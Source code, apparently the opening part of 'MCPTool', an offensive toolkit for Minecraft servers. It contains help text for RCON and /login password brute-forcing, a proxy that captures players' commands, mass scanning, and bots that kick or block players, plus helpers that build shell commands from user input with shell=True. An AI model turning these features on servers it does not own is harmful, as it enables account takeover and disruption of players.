#!/usr/bin/python3

# =============================================================================
#                      MCPTool v3.0 www.github.com/wrrulos
#                         Pentesting Tool for Minecraft
#                               Made by wRRulos
#                                  @wrrulos
# =============================================================================

# Any error report it to my discord please, thank you. 
# Programmed in Python 3.10.6

import shutil
import subprocess
import json
import sys
import time
import os
import requests
import socket
import re
import traceback
import uuid
import hashlib
import base64
import random
import shodan

from datetime import datetime
from colorama import Fore, init
from mcstatus import JavaServer
from json import JSONDecodeError
from mcrcon import MCRcon, MCRconException

init()

mojang_api = 'https://api.mojang.com/users/profiles/minecraft/'
mcsrvstat_api = 'https://api.mcsrvstat.us/2/'

red, lred, black, lblack, white, green, lgreen, cyan, lcyan, magenta, lmagenta, yellow, lyellow, blue, lblue, reset = Fore.RED, Fore.LIGHTRED_EX, Fore.BLACK, Fore.LIGHTBLACK_EX, Fore.WHITE, Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.CYAN, Fore.LIGHTCYAN_EX, Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.YELLOW, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.RESET
check_proxy_update, scan_stopped, host_command, first, connect_bot, logs_file, scanned_servers, lang, version_check, starting_screen, system, test_proxy_timeout, shodan_token, current_version, v, proxy_version, banner, python_command, proxy_command, qubo_threads, qubo_timeout, qubo_command, ngrok_command, bungee_port, poisoning_port, hosts, dependencies = True, False, False, False, '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', [], []
json_characters = ['"extra"', '"obfuscated"', '"translate"', '"strikethrough"', '"underlined"', '"italic"', '"bold"', '"text"', '"color"', 'false,', 'true,', '{', '}', '[', ']', ':', '],', '{"text":', 'translatemultiplayer.disconnect.unverified_username', 'translatemultiplayer.disconnect.not_whitelisted', 'translatemultiplayer.disconnect.banned.reasonwith', 'translatemultiplayer.disconnect.banned_ip.reasonwith', 'Not authenticated with clickEventactionopen_urlvaluehttp//Minecraft.netMinecraft.net', 'multiplayer.disconnect.not_whitelisted', 'This server has mods that require Forge to be installed on the client. Contact your server admin for more details.', 'This server has mods that require FML/Forge to be installed on the client. Contact your server admin for more details.', 'multiplayer.disconnect.unverified_username', '"red"', '"dark_red"', '"gold"', '"yellow"', '"dark_green"', '"green"', '"aqua"', '"dark_aqua"', '"dark_aqua"', '"dark_blue"', '"blue"', '"light_purple"', '"dark_purple"', '"white"', '"gray"', '"dark_gray"', '"black"', '"', ',', 'text:']
command_list = ['server', 'player', 'ip', 'ipinfo', 'search', 'scan', 'host', 'checker', 'listening', 'bungee', 'poisoning', 'rcon', 'auth', 'connect', 'rconnect', 'kick', 'kickall', 'block', 'discord']

start_banner = rf"""
                                         {lred}                         __
                                         {lred}           ---_ ...... _/_ -
                                         {lred}          /  .      ./ .'*\ \
                                         {lred}          : '         /__-'   \.
                                         {lred}         /                      )     
                                         {lred}       _/                  >   .'     
                                         {lred}     /   '   .       _.-" /  .'      
                                         {white}     \           __/"     /.'      
                                         {white}       \ '--  .-" /     //'          
                                         {white}        \|  \ | /     //      
                                         {white}          `\/     //
                                         {white}           \__`\/ /                    
                                         {white}               \_|


                    {reset}"""


help_messages = ['', f'''{white}
    ╔═══════════════════════════════════╦═════════════════════════════════════════════════════╗
    ║                                   ║                                                     ║ 
    ║ {lred}server{white} <ip:port/domain>           ║ Displays information about a server.                ║
    ║                                   ║                                                     ║  
    ║ {lred}player{white} <username>                 ║ Displays information about a username.              ║
    ║                                   ║                                                     ║  
    ║ {lred}ip{white} <domain>                       ║ Returns the IP address of a domain                  ║
    ║                                   ║                                                     ║  
    ║ {lred}ipinfo{white} <ip>                       ║ Returns information of the specified ip             ║
    ║                                   ║                                                     ║
    ╚═══════════════════════════════════╩═════════════════════════════════════════════════════╝
    
    {lmagenta}> {white}To see the next page use: help 2''', f'''{white}
    ╔═══════════════════════════════════╦═════════════════════════════════════════════════════╗
    ║                                   ║                                                     ║  
    ║ {lred}search{white} <data>                     ║ Find servers that contain the specified data.       ║
    ║                                   ║                                                     ║  
    ║ {lred}scan{white} <ip/file> <ports> <method>   ║ Scan the ports of an IP address using different     ║
    ║ <checker: y/n> [<proxy>]          ║ types of scanners. (You can also scan a file        ║
    ║                                   ║ containing a list of IP addresses)                  ║
    ║                                   ║                                                     ║ 
    ║ {lred}host{white} <host> <ports> <method>      ║ Scan the nodes of a host using different types of   ║
    ║ <checker: y/n> [<proxy>]          ║ scanners.                                           ║
    ║                                   ║                                                     ║ 
    ║ {lred}checker{white} <file> <checker: y/n>     ║ Check if servers found in a file can be accessed.   ║
    ║ [<proxy>]                         ║                                                     ║    
    ║                                   ║                                                     ║     
    ╚═══════════════════════════════════╩═════════════════════════════════════════════════════╝
    
    {lmagenta}> {white}To see the next page use: help 3''', f'''{white}
    ╔═══════════════════════════════════╦═════════════════════════════════════════════════════╗
    ║                                   ║                                                     ║ 
    ║ {lred}listening{white} <ip:port/domain>        ║ It listens for names coming into the server.        ║
    ║                                   ║ (Ideal to know who has access to the whitelist)     ║
    ║                                   ║                                                     ║  
    ║ {lred}bungee{white} <ip:port/domain>           ║ Start a proxy server that redirects to the          ║
    ║                                   ║ specified server.                                   ║
    ║                                   ║                                                     ║  
    ║ {lred}poisoning{white} <ip:port/domain>        ║ Start a proxy server that redirects to the          ║
    ║                                   ║ specified server and captures the commands          ║
    ║                                   ║ that are sent within it.                            ║
    ║ {lred}rcon{white} <ip:rcon-port> <file>        ║ Initiate a brute force attack to access the         ║
    ║                                   ║ console. (via RCON)                                 ║
    ║                                   ║                                                     ║    
    ╚═══════════════════════════════════╩═════════════════════════════════════════════════════╝
    
    {lmagenta}> {white}To see the next page use: help 4''', f'''{white}
    ╔═══════════════════════════════════╦═════════════════════════════════════════════════════╗
    ║                                   ║                                                     ║
    ║ {lred}auth{white} <ip:port> <username> <file>  ║ Initiate a brute force attack to access the         ║
    ║                                   ║ user's account. (via /login)                        ║
    ║                                   ║                                                     ║  
    ║ {lred}connect{white} <ip:port> <username>      ║ Connect to the server through a bot.                ║
    ║ [<proxy>]                         ║                                                     ║ 
    ║                                   ║                                                     ║   
    ║ {lred}rconnect{white} <ip:port> <username>     ║ Connect to the server through RCON.                 ║
    ║                                   ║                                                     ║  
    ║ {lred}kick{white} <ip:port/domain> <name>      ║ Kick a player from the server.                      ║
    ║ [<proxy>]                         ║                                                     ║   
    ║                                   ║                                                     ║     
    ╚═══════════════════════════════════╩═════════════════════════════════════════════════════╝
    
    {lmagenta}> {white}To see the next page use: help 5''', f'''{white}
    ╔═══════════════════════════════════╦═════════════════════════════════════════════════════╗
    ║                                   ║                                                     ║ 
    ║ {lred}kickall{white} <ip:port/domain>          ║ Kick all players from the server.                   ║
    ║ [<proxy>]                         ║                                                     ║
    ║                                   ║                                                     ║
    ║ {lred}block{white} <ip:port/domain> <name>     ║ Kick a player off the server without stopping.      ║
    ║ [<proxy>]                         ║ (Infinite loop)                                     ║
    ║                                   ║                                                     ║   
    ║ {lred}discord{white}                           ║ Show link to join my Discord server.                ║
    ║                                   ║                                                     ║  
    ╚═══════════════════════════════════╩═════════════════════════════════════════════════════╝''']


help_messages_list_commands = [f'''
    {lred}Command: {white}server
    {lred}Usage: {white}server <ip:port/domain>

    {white}Displays information about a server.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {white}-> IP address and port or domain of the server.

    {lred}Example:
        {white}server {lgreen}hypixel.net
''', f'''
    {lred}Command: {white}player
    {lred}Usage: {white}player <username>

    {white}Displays information about a username.

    {lred}Arguments:
        {lgreen}<username> {white}-> Minecraft username.

    {lred}Example:
        {white}player {lgreen}wRRulos
''', f'''
    {lred}Command: {white}ip
    {lred}Usage: {white}ip <domain>

    {white}Returns the IP address of a domain.

    {lred}Arguments:
        {lgreen}<ip> {white}-> IP address.

    {lred}Example:
        {white}ip {lgreen}mc.universocraft.com
''', f'''
    {lred}Command: {white}ipinfo
    {lred}Usage: {white}ipinfo <ip>

    {white}Returns information of the specified ip

    {lred}Arguments:
        {lgreen}<ip> {white}-> IP address.

    {lred}Example:
        {white}ipinfo {lgreen}51.79.106.228
''', f'''
    {lred}Command: {white}search
    {lred}Usage: {white}search <data>

    {white}Find servers that contain the specified data.
    You can add more data separating it with ' --- '

    {lred}Arguments:
        {lgreen}<data> {white}-> Data.

    {lred}Examples:
        {white}search {lgreen}Spigot 1.8.8
        {white}search {lgreen}Spigot 1.8.8 --- Lobby
''', f'''
    {lred}Command: {white}scan
    {lred}Usage: {white}scan <ip> <ports> <method> <checker: y/n> [<proxy>]

    {white}Scan the ports of an IP address using different types of scanners. 
    (You can also scan a file containing a list of IP addresses)

    {lred}Arguments:
        {lgreen}<ip> {white}-> IP address.
        {lmagenta}<port> {white}-> Range of ports you are going to scan.
        {lyellow}<method> {white}-> The type of scanner you are going to use. (Nmap or qubo)
        {lblue}<checker: y/n> {white}-> Confirm if a bot should be sent to check the server. If you want to send a bot, enter 'y'.
        {lcyan}[<proxy>] {white}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {white}scan {lgreen}127.0.0.1 {lmagenta}25560-25570 {lyellow}0 {lblue}n
        {white}scan {lgreen}127.0.0.1 {lmagenta}25560-25570 {lyellow}0 {lblue}y
        {white}scan {lgreen}127.0.0.1 {lmagenta}25560-25570 {lyellow}0 {lblue}y {lcyan}164.60.26.2:7472
''', f'''
    {lred}Command: {white}host
    {lred}Usage: {white}host <host> <ports> <method> <checker: y/n> [<proxy>]

    {white}Scan the nodes of a host using different types of scanners.

    {lred}Arguments:
        {lgreen}<host> {white}-> Hostname.
        {lmagenta}<port> {white}-> Range of ports you are going to scan.
        {lyellow}<method> {white}-> The type of scanner you are going to use. (Nmap or qubo)
        {lblue}<checker: y/n> {white}-> Confirm if a bot should be sent to check the server. If you want to send a bot, enter 'y'.
        {lcyan}[<proxy>] {white}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {white}host {lgreen}minehost {lmagenta}25560-25570 {lyellow}0 {lblue}n
        {white}host {lgreen}vultam {lmagenta}25560-25570 {lyellow}0 {lblue}y
        {white}host {lgreen}vultam {lmagenta}25560-25570 {lyellow}0 {lblue}y {lcyan}164.60.26.2:7472
''', f'''
    {lred}Command: {white}checker
    {lred}Usage: {white}checker <file> <checker: y/n> [<proxy>]

    {white}Check if servers found in a file can be accessed.

    {lred}Arguments:
        {lgreen}<file> {white}-> File containing ips addresses.
        {lmagenta}<checker: y/n> {white}-> Confirm if a bot should be sent to check the server. If you want to send a bot, enter 'y'.
        {lyellow}[<proxy>] {white}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {white}checker {lgreen}file.txt {lmagenta}n
        {white}checker {lgreen}file.txt {lmagenta}y
        {white}checker {lgreen}file.txt {lmagenta}y {lyellow}164.60.26.2:7472
''', f'''
    {lred}Command: {white}listening
    {lred}Usage: {white}listening <ip:port/domain>

    {lred}Arguments:
        {lgreen}<ip:port/domain> {white}-> IP address and port or domain of the server.

    {lred}Example:
        {white}listening {lgreen}127.0.0.1:25565
''', f'''
    {lred}Command: {white}bungee
    {lred}Usage: {white}bungee <ip:port/domain>

    {white}Start a proxy server that redirects to the specified server.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {white}-> IP address and port or domain of the server.

    {lred}Example:
        {white}bungee {lgreen}127.0.0.1:25565
''', f'''
    {lred}Command: {white}poisoning
    {lred}Usage: {white}poisoning <ip:port/domain>

    {white}Start a proxy server that redirects to the specified server and captures the commands
    that are sent within it.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {white}-> IP address and port or domain of the server.

    {lred}Example:
        {white}poisoning {lgreen}127.0.0.1:25565
''', f'''
    {lred}Command: {white}rcon
    {lred}Usage: {white}rcon <ip:rcon-port> <file>

    {white}Initiate a brute force attack to access the console. (via RCON)

    {lred}Arguments:
        {lgreen}<ip:rcon-port> {white}-> IP address and rcon port of the server.
        {lmagenta}<file> {white}-> Location of the password dictionary.

    {lred}Example:
        {white}rcon {lgreen}127.0.0.1:25575 {lmagenta}passwords/test.txt
''', f'''
    {lred}Command: {white}auth
    {lred}Usage: {white}auth <ip:port> <file>

    {white}Initiate a brute force attack to access the user's account. (via /login)

    {lred}Arguments:
        {lgreen}<ip:port> {white}-> IP address and port of the server.
        {lmagenta}<username> {white}-> Username
        {lyellow}<file> {white}-> Location of the password dictionary.

    {lred}Example:
        {white}auth {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}passwords/test.txt
''', f'''
    {lred}Command: {white}connect
    {lred}Usage: {white}connect <ip:port> <username> [<proxy>]

    {white}Connect to the server through a bot.

    {lred}Arguments:
        {lgreen}<ip:port> {white}-> IP address and port of the server.
        {lmagenta}<username> {white}-> Username
        {lyellow}[<proxy>] {white}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {white}connect {lgreen}127.0.0.1:25565 {lmagenta}wRRulos 
        {white}connect {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}164.60.26.2:7472
''', f'''
    {lred}Command: {white}rconnect
    {lred}Usage: {white}rconnect <ip:rcon-port> <password>

    {white}Connect to the server through RCON.

    {lred}Arguments:
        {lgreen}<ip:rcon-port> {white}-> IP address and rcon port of the server.
        {lmagenta}<password> {white}-> RCON Password

    {lred}Example:
        {white}rconnect {lgreen}127.0.0.1:25575 {lmagenta}password 
''', f'''
    {lred}Command: {white}kick
    {lred}Usage: {white}kick <ip:port> <name> [<proxy>]

    {white}Kick a player from the server.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {white}-> IP address and port or domain of the server.
        {lmagenta}<name> {white}-> Username
        {lyellow}[<proxy>] {white}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {white}kick {lgreen}127.0.0.1:25565 {lmagenta}wRRulos 
        {white}kick {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}164.60.26.2:7472
''', f'''
    {lred}Command: {white}kickall
    {lred}Usage: {white}kickall <ip:port> [<proxy>]

    {white}Kick all players from the server.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {white}-> IP address and port or domain of the server.
        {lmagenta}[<proxy>] {white}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {white}kickall {lgreen}127.0.0.1:25565
        {white}kickall {lgreen}127.0.0.1:25565 {lmagenta}164.60.26.2:7472
''', f'''
    {lred}Command: {white}block
    {lred}Usage: {white}block <ip:port> <name> [<proxy>]

    {white}Kick a player off the server without stopping. (Infinite loop)

    {lred}Arguments:
        {lgreen}<ip:port/domain> {white}-> IP address and port or domain of the server.
        {lmagenta}<name> {white}-> Username
        {lyellow}[<proxy>] {white}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {white}block {lgreen}127.0.0.1:25565 {lmagenta}wRRulos 
        {white}block {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}164.60.26.2:7472
''']


def progressbar(it, prefix='', size=60, out=sys.stdout):
    """
    Progress bar for the start of the tool. This code was taken from https://stackoverflow.com/questions/3160699/python-progress-bar, 
    I just made a few small changes to fit it here
    """

    count = len(it)

    def show(j):
        x = int(size*j/count)
        print('{}{}{}[{}{}] {}{}/{}'.format(white, prefix, lgreen, '#'*x, '.'*(size-x), white, j, count), end='\r', file=out, flush=True)

    show(0)

    for i, item in enumerate(it):
        yield item
        show(i+1)

    print('\n', flush=True, file=out)


def save_settings():
    """
    Read the 'settings.json' file and save the settings.
    """

    global lang, bungee_port, poisoning_port, version_check, starting_screen, ngrok_command, proxy_command, python_command, test_proxy_timeout, shodan_token, qubo_threads, qubo_timeout, qubo_command, current_version, v, proxy_version, dependencies, hosts, system, banner

    try:
        f = open('settings/settings.json', 'r')
        content = f.read()
        f.close()

    except FileNotFoundError:
        subprocess.run('cls || clear', shell=True)
        print(f'{start_banner}       {lred}The configuration file was not found. Open the tool properly to fix this.', end='')
        time.sleep(5)
        sys.exit()

    js = json.loads(content)

    version_check = js['version_check']
    starting_screen = js['starting_screen']
    shodan_token = js['shodan_token']
    bungee_port = js['bungee_port']
    poisoning_port = js['poisoning_port']
    python_command = js['python_command']
    ngrok_command = js['ngrok_command']
    proxy_command = js['proxy_command']
    test_proxy_timeout = js['test_proxy_timeout']

    qubo_threads = js['qubo']['threads']
    qubo_timeout = js['qubo']['timeout']
    qubo_command = js['qubo']['command']

    script_version = js['version']
    script_version = script_version.split('///')
    current_version = script_version[0]
    v = script_version[1]
    proxy_version = js['proxy_version']

    for dependence in js['dependencies']:
        dependencies.append(dependence)

    for host in js['hosts']:
        hosts.append(host['name'])

    if os.name == 'nt':
        system = 'windows'

    else:
        system = 'linux'

    banner = rf"""{red}
                                                            {white}d8b 
                                      d8P                   88P {red}
                                   {white}d888888P                d88  {red}        {white}The Best Pentesting Tool for Minecraft{red} 
      88bd8b,d88b  d8888b?88,.d88b,  {white}?88'   d8888b  d8888b 888  {red}        {lred}      -> Free and open source <-{red}
      88P'`?8P'?8bd8P' `P`?88'  ?88  {white}88P   d8P' ?88d8P' ?88?88  {red}                     {white}Version: {lgreen}{v}{red}
     d88  d88  88P88b      88b  d8P  {white}88b   88b  d8888b  d88 88b {red}
    d88' d88'  88b`?888P'  888888P'  {white}`?8b  `?8888P'`?8888P'  88b{red}        {lcyan}Developed by wrrulos ({white}@wrrulos{lcyan}){red}
                           88P'                                 
                          d88                                   
                          ?8P                                  

"""


def animated_text(text, sleep_time):
    """
    Show the text as an animation
    """

    for _ in text:
        print(_, end='')
        time.sleep(sleep_time)


def replace_json_text(text):
    """ 
    Replace json characters
    """

    for characters in json_characters:
        if '"red"' == characters:
            text = text.replace(characters, '{}'.format(lred))

        elif '"dark_red"' == characters:
            text = text.replace(characters, '{}'.format(red))

        elif '"gold"' == characters:
            text = text.replace(characters, '{}'.format(lyellow))

        elif '"yellow"' == characters:
            text = text.replace(characters, '{}'.format(yellow))

        elif '"dark_green"' == characters:
            text = text.replace(characters, '{}'.format(green))

        elif '"green"' == characters:
            text = text.replace(characters, '{}'.format(lgreen))

        elif '"aqua"' == characters:
            text = text.replace(characters, '{}'.format(lcyan))

        elif '"dark_aqua"' == characters:
            text = text.replace(characters, '{}'.format(cyan))

        elif '"dark_blue"' == characters:
            text = text.replace(characters, '{}'.format(blue))

        elif '"blue"' == characters:
            text = text.replace(characters, '{}'.format(lblue))

        elif '"light_purple"' == characters:
            text = text.replace(characters, '{}'.format(lmagenta))

        elif '"dark_purple"' == characters:
            text = text.replace(characters, '{}'.format(magenta))

        elif '"white"' == characters or '"gray"' == characters or '"dark_gray"' == characters:
            text = text.replace(characters, '{}'.format(white))

        elif '"black"' == characters:
            text = text.replace(characters, '{}'.format(black))

        elif 'text:' == characters:
            text = text.replace('text:', '§f')

        elif 'translatemultiplayer.disconnect.unverified_username' == characters:
            text = text.replace(characters, '§6Premium Server')

        elif 'translatemultiplayer.disconnect.not_whitelisted' == characters or 'multiplayer.disconnect.not_whitelisted' == characters or 'You are not whitelisted on this server!' == characters:
            text = text.replace(characters, '§bWhitelist')

        elif 'translatemultiplayer.disconnect.banned.reasonwith' == characters:
            text = text.replace(characters, '§cBanned: §f')

        elif 'translatemultiplayer.disconnect.banned_ip.reasonwith' == characters:
            text = text.replace(characters, '§cIP Banned: §f')

        elif 'Not authenticated with clickEventactionopen_urlvaluehttp//Minecraft.netMinecraft.net' == characters:
            text = text.replace(characters, '§eServer premium or bot name is premium and server is semi premium')

        elif 'This server has mods that require Forge to be installed on the client. Contact your server admin for more details.' == characters or 'This server has mods that require FML/Forge to be installed on the client. Contact your server admin for more details.' == characters:
            text = text.replace(characters, '§5Forge Server')

        elif 'multiplayer.disconnect.unverified_username' == characters:
            text = text.replace(characters, '§6The server has online mode activated')

        else:
            text = text.replace(characters, '')

    return text


def replace_text_mccolors(text):
    """
    Replace colored characters with their respective color
    """

    if '§0' in text:
        text = text.replace('§0', '{}'.format(lblack))

    if '§1' in text:
        text = text.replace('§1', '{}'.format(blue))

    if '§2' in text:
        text = text.replace('§2', '{}'.format(lgreen))

    if '§3' in text:
        text = text.replace('§3', '{}'.format(cyan))

    if '§4' in text:
        text = text.replace('§4', '{}'.format(red))

    if '§5' in text:
        text = text.replace('§5', '{}'.format(magenta))

    if '§6' in text:
        text = text.replace('§6', '{}'.format(yellow))

    if '§7' in text:
        text = text.replace('§7', '{}'.format(lblack))

    if '§8' in text:
        text = text.replace('§8', '{}'.format(lblack))

    if '§9' in text:
        text = text.replace('§9', '{}'.format(lblue))

    if '§a' in text:
        text = text.replace('§a', '{}'.format(lgreen))

    if '§b' in text:
        text = text.replace('§b', '{}'.format(lcyan))

    if '§c' in text:
        text = text.replace('§c', '{}'.format(lred))

    if '§d' in text:
        text = text.replace('§d', '{}'.format(lmagenta))

    if '§e' in text:
        text = text.replace('§e', '{}'.format(lyellow))

    if '§f' in text:
        text = text.replace('§f', '{}'.format(white))

    if '§k' in text or '§l' in text or '§m' in text or '§n' in text or '§o' in text or '§r' in text:
        text = text.replace('§k', '').replace('§l', '').replace('§m', '').replace('§n', '').replace('§o', '').replace('§r', '')

    if '§A' in text:
        text = text.replace('§A', '{}'.format(lgreen))

    if '§B' in text:
        text = text.replace('§B', '{}'.format(lcyan))

    if '§C' in text:
        text = text.replace('§C', '{}'.format(lred))

    if '§D' in text:
        text = text.replace('§D', '{}'.format(lmagenta))

    if '§E' in text:
        text = text.replace('§E', '{}'.format(lyellow))

    if '§F' in text:
        text = text.replace('§F', '{}'.format(white))

    if '§K' in text or '§L' in text or '§M' in text or '§N' in text or '§O' in text or '§R' in text:
        text = text.replace('§K', '').replace('§L', '').replace('§M', '').replace('§N', '').replace('§O', '').replace('§R', '')

    if '\n' in text:
        text = text.replace('\n', '')

    return text


def clean_checker_output(output):
    """
    Returns the clean output to save to a text file.
    """

    for character in json_characters:
        if 'translatemultiplayer.disconnect.unverified_username' == character:
            output = output.replace(character, 'Premium Server')

        elif 'translatemultiplayer.disconnect.not_whitelisted' == character or 'multiplayer.disconnect.not_whitelisted' == character or 'You are not whitelisted on this server!' == character:
            output = output.replace(character, 'Whitelist')

        elif 'translatemultiplayer.disconnect.banned.reasonwith' == character:
            output = output.replace(character, 'Banned: ')

        elif 'translatemultiplayer.disconnect.banned_ip.reasonwith' == character:
            output = output.replace(character, 'IP Banned: ')

        elif 'Not authenticated with clickEventactionopen_urlvaluehttp//Minecraft.netMinecraft.net' == character:
            output = output.replace(character, 'Server premium or bot name is premium and server is semi premium')

        elif 'This server has mods that require Forge to be installed on the client. Contact your server admin for more details.' == character or 'This server has mods that require FML/Forge to be installed on the client. Contact your server admin for more details.' == character:
            output = output.replace(character, 'Forge Server')

        elif 'multiplayer.disconnect.unverified_username' == character:
            output = output.replace(character, 'The server has online mode activated')

        else:
            output = output.replace(character, '')

    return output


def check_dependencies():
    """
    Check if the dependencies are installed.
    """

    for dependence in dependencies:
        if subprocess.call(f'{dependence[1]} >nul 2>&1', shell=True) != 0:
            subprocess.run('cls || clear', shell=True)
            print(f"{start_banner}        {lred}You don't have {red}{dependence[0]} {lred}installed. Install it and start the tool again.\n\n                                         {white}You can get help on my {lcyan}discord {white}server.\n\n                                                {lgreen}", end='')
            animated_text('discord.gg/ewPyW4Ghzj\n', 0.08)
            time.sleep(3)
            sys.exit()


def check_version():
    """
    Check version
    """

    connection = check_connection()

    if connection:
        r = requests.get('https://raw.githubusercontent.com/wrrulos/MCPTool/main/settings/settings.json')  # Get the latest version
        last_version = r.text
        js_version = json.loads(last_version)
        last_version = js_version['version']
        last_version = last_version.split('///')
        last_version = last_version[0]

    else:
        last_version = current_version

    if int(last_version) != int(current_version):
        return True

    return False


def check_proxy_version():
    """
    Check proxy version
    """

    print(f'\n    {red}[{lred}UPD{white}ATE{red}] {white}Checking if there is a new version of the proxy server.')
    time.sleep(1)

    r = requests.get('https://raw.githubusercontent.com/wrrulos/MCPTool/main/settings/settings.json')  # Get the latest version
    settings = r.text
    json_settings = json.loads(settings)
    latest_proxy_version = json_settings['proxy_version']

    if proxy_version != latest_proxy_version:
        print(f'\n    {red}[{lred}UPD{white}ATE{red}] {white}New version found. Preparing the {lgreen}download{white}..')
        update_proxy(latest_proxy_version)

    else:
        print(f'\n    {red}[{lred}UPD{white}ATE{red}] {white}No updates available.')


def check_proxy(ip, port):
    """
    Check if the proxy server is active
    """

    output = subprocess.run(f'curl -x "socks5://{ip}:{port}" "http://ifconfig.me" --connect-timeout {test_proxy_timeout} --no-progress-meter', stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    output = str(output.stdout).replace("b'", '').replace('\r', '').replace('\n', '').replace("'", '')

    if output == ip:
        print(f'\n    {red}[{lred}PRO{white}XY{red}] {lgreen}The proxy {ip}:{port} is valid!')
        time.sleep(1)
        return True

    print(f'\n    {red}[{lred}PRO{white}XY{red}] {lred}The proxy server did not generate a response. ({red}Timeout{lred})')
    return False


def check_folder(*args):
    """ 
    Check if the following folders exist 
    """

    for folder in args:
        if os.path.isdir(folder):
            pass

        else:
            os.mkdir(folder)


def check_script_folders():
    """
    Check if all the Script folders are there. This is to check if the tool was opened correctly.
    """

    if os.path.isdir('settings'):
        if os.path.isdir('settings/files'):
            if os.path.isdir('settings/proxy_servers'):
                if os.path.isdir('settings/qubo'):
                    if os.path.isdir('settings/scripts'):
                        return True

    return False


def check_encoding(file):
    """
    Check encoding
    """

    try:
        f = open(file, 'r+', encoding='utf8')
        f.read()
        f.close()
        return 'utf8'

    except:  # (SyntaxError, UnicodeDecodeError)
        f = open(file, 'r+', encoding='unicode_escape')
        f.read()
        f.close()
        return 'unicode_escape'


def check_scan_method(method):
    """
    Check the chosen method
    """

    if str(method).lower() == 'nmap':
        return '0'

    elif str(method).lower() == 'qubo' or str(method).lower() == 'quboscanner':
        return '1'

    """elif str(method).lower() == 'masscan':
        return '2'"""

    return method


def check_scan_error(scan_file, target):
    """
    Check if there was an error in the scan
    """

    try:
        f = open(scan_file, 'r')
        content = f.read()
        f.close()

    except FileNotFoundError:  # CTRL C
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}File not found.')
        return 'file'

    if 'Ports specified must be between 0 and 65535 inclusive' in content or 'Your port specifications are illegal.' in content or 'Found no matches for the service mask' in content or 'is backwards. Did you mean' in content:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid port range.')
        return 'ports'

    if f'Failed to resolve "{target}".' in content:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The IP address or domain entered does not exist.')
        return 'target'

    if 'QUITTING!' in content:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Unknown')
        return 'unknown'

    return 'None'


def check_ip(ip, port):
    """
    Checks if the 'ip' and 'port' arguments are valid.
    """

    try:
        socket.inet_pton(socket.AF_INET, ip)

    except socket.error:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The IP address is not valid.')
        return False

    try:
        if int(port) <= 65535:
            return True

    except ValueError:
        pass

    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid port.')
    return False


def check_connection():
    """
    Check for connection via sockets
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    try:
        s.connect(('www.google.com', 80))
        s.close()
        return True

    except (socket.gaierror, socket.timeout):
        return False


def update_proxy(download_link):
    """
    Update proxys servers
    """

    print(f'\n    {red}[{lred}DOWN{white}LOAD{red}] {lgreen}Downloading the latest version of the proxy. ({lcyan}WaterFall.Jar{lgreen})')

    check_folder('mcptool_temp')

    with open('mcptool_temp/WaterFall.jar', 'wb') as file:
        proxy = requests.get(download_link)
        file.write(proxy.content)

    print(f'\n    {red}[{lred}DOWN{white}LOAD{red}] {lgreen}Updating proxy servers..')

    os.remove('settings/proxy_servers/poisoning/WaterFall.jar')
    os.remove('settings/proxy_servers/bungee/WaterFall.jar')
    shutil.copy('mcptool_temp/WaterFall.jar', 'settings/proxy_servers/poisoning/WaterFall.jar')
    shutil.copy('mcptool_temp/WaterFall.jar', 'settings/proxy_servers/bungee/WaterFall.jar')
    os.remove('mcptool_temp/WaterFall.jar')
    os.rmdir('mcptool_temp')

    f = open('settings/settings.json', 'r')
    content = f.read()
    f.close()

    js = json.loads(content)
    js['proxy_version'] = download_link

    with open('settings/settings.json', 'w') as f:
        json.dump(js, f, indent=4)

    print(f'\n    {red}[{lred}DOWN{white}LOAD{red}] {lgreen}The update is finished!')


def save_logs(ip, location, command, message):
    """ 
    Create logs file
    """

    date = datetime.now()
    file = f'{location}_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt'
    f = open(file, 'w+', encoding='utf8')

    if ip is not None:
        f.write(f'[>] MCPTool - By @wrrulos\n\n# Log information\n\n • Command: {command}\n • Date and time: {str(date.year)}-{str(date.month)}-{str(date.day)} {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n • Target: {ip}\n\n{message}\n')

    else:
        f.write(f'[>] MCPTool - By @wrrulos\n\n# Log information\n\n • Date and time: {str(date.year)}-{str(date.month)}-{str(date.day)} {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n\n{message}\n')

    f.close()
    return file


def fix_file():
    """
    Remove unnecessary line breaks from the file
    """

    f = open(logs_file, 'r+', encoding='utf8')
    content = f.readlines()
    f.close()
    new_content = []
    x = 0

    for line in content:
        if connect_bot:
            if x == 2:
                if line == '\n':
                    line = line.replace('\n', '')

                else:
                    x = 0

            if x == 1:
                if line == '\n':
                    x = 2

            if '[Checker]' in line:
                x = 1

            new_content.append(line)

    if connect_bot:
        new_content = ''.join(new_content)

